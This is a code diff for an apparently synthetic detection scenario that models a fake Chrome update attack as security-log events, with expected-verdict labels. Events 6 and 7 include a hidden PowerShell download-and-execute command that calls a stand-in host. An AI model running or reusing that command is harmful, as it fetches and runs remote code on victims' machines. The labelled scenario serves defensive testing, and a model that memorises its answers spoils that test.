@@ -63,14 +63,19 @@ export function buildFakeBrowserUpdateScenario(
     // ---------------------------------------------------------------------
 
     // 1. Ordinary browsing on the (compromised) trade publication.
-    panWeb({
+    {
+      ...panWeb({
       ...cs, id: "evt_fbu_01_site_visit", ts: T(0), severity: "low",
       url: `https://${compromisedSite}/2026/06/port-congestion-outlook`, domain: compromisedSite,
       category: "business-and-economy", action: "alert", dstIp: "185.199.108.153", status: 200, bytesIn: 148_320,
       userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0 Safari/537.36",
       userTitle: "Logistics Coordinator",
-      description: "LAP-4471 loaded an article page on logisticsweekly.com at 13:42, allowed under the category business-and-economy.",
-    }),
+      description: "LAP-4471 loaded an article page on logisticsweekly.com, allowed under the category business-and-economy.",
+      }),
+      // A real employee reading a real trade publication — the legitimate first step
+      // of the story (the attack begins at the hand-off in evt_fbu_02).
+      is_baseline: true,
+    },
 
     // 2. The injected overlay pulls its payload from an unrelated host.
     panWeb({
@@ -78,7 +83,7 @@ export function buildFakeBrowserUpdateScenario(
       url: `https://${stagingHost}/loader/update-check.js`, domain: stagingHost,
       category: "computer-and-internet-info", action: "alert", dstIp: "91.219.238.14", status: 200, bytesIn: 12_744,
       referer: `https://${compromisedSite}/2026/06/port-congestion-outlook`, mitre: "T1189", tactic: "Initial Access",
-      description: "Seventy-two seconds into the page view, the same browser session requested /loader/update-check.js from cdn-static-assets-92.net, referred by the logisticsweekly.com article.",
+      description: "During the same page view, the browser session requested /loader/update-check.js from cdn-static-assets-92.net, referred by the logisticsweekly.com article.",
     }),
 
     // 3. The user downloads the "update" — a JScript file.
@@ -88,14 +93,14 @@ export function buildFakeBrowserUpdateScenario(
       category: "computer-and-internet-info", action: "alert", dstIp: "91.219.238.14", status: 200, bytesIn: 341_902,
       file: { name: "Chrome_Update_127.0.6533.js", path: "/download/Chrome_Update_127.0.6533.js", sha256: scriptHash, size: 341_902 },
       fileType: "script", mitre: "T1189", tactic: "Initial Access",
-      description: "At 13:45:40 the same host downloaded Chrome_Update_127.0.6533.js from cdn-static-assets-92.net over the same session.",
+      description: "The same host then downloaded Chrome_Update_127.0.6533.js from cdn-static-assets-92.net over the same session.",
     }),
 
     // 4. The file is written to disk (by chrome.exe).
     csFile({
       ...cs, id: "evt_fbu_04_file_write", ts: T(3 * MIN + 44_000),
       path: "C:\\Users\\d.rosen\\Downloads\\Chrome_Update_127.0.6533.js", sha256: scriptHash, severity: "low",
-      description: "chrome.exe wrote C:\\Users\\d.rosen\\Downloads\\Chrome_Update_127.0.6533.js at 13:45:44.",
+      description: "chrome.exe wrote C:\\Users\\d.rosen\\Downloads\\Chrome_Update_127.0.6533.js to disk.",
     }),
 
     // 5. THE CRUX — the user double-clicks: explorer -> wscript with the .js as its arg.
@@ -105,7 +110,7 @@ export function buildFakeBrowserUpdateScenario(
       cmdline: 'wscript.exe "C:\\Users\\d.rosen\\Downloads\\Chrome_Update_127.0.6533.js"',
       parentName: "explorer.exe", parentPid: 3560, sha256: wscriptHash, signed: true,
       mitre: "T1204.002", tactic: "Execution", severity: "high", isDetection: true,
-      description: "At 13:47:08 explorer.exe started wscript.exe with the downloaded .js file as its argument.",
+      description: "explorer.exe started wscript.exe with the downloaded .js file as its argument.",
     }),
 
     // 6. wscript spawns hidden PowerShell with a download-and-run command.
@@ -114,8 +119,8 @@ export function buildFakeBrowserUpdateScenario(
       processName: "powershell.exe", pid: 9388, processPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
       cmdline: "powershell.exe -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('https://api-telemetry-sync.com/s/2')\"",
       parentName: "wscript.exe", parentPid: 9312, sha256: powershellHash, signed: true,
-      mitre: "T1059.001", tactic: "Execution", severity: "critical",
-      description: "Three seconds later wscript.exe spawned powershell.exe with a download-and-run command line pointing at api-telemetry-sync.com.",
+      mitre: "T1059.001", tactic: "Execution", severity: "critical", isDetection: true,
+      description: "wscript.exe spawned powershell.exe with a download-and-run command line pointing at api-telemetry-sync.com.",
     }),
 
     // 7. The second-stage fetch is refused at the perimeter (block-url).
@@ -133,7 +138,7 @@ export function buildFakeBrowserUpdateScenario(
         processName: "powershell.exe", pid: 9388, parentPid: 9312,
         processPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         cmdline: "powershell.exe -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('https://api-telemetry-sync.com/s/2')\"",
-        sha256: powershellHash, threatName: "ScriptBasedDropperFromBrowserDownload",
+        sha256: powershellHash, threatName: "Suspicious PowerShell download cradle launched by a script host",
         action: "killed", expectedVerdict: "tp", mitre: "T1204.002", tactic: "Execution",
         technique: "User Execution: Malicious File", severity: "critical",
         description: "Falcon raised a Critical detection on LAP-4471 for the explorer → wscript → powershell chain and killed the PowerShell process.",
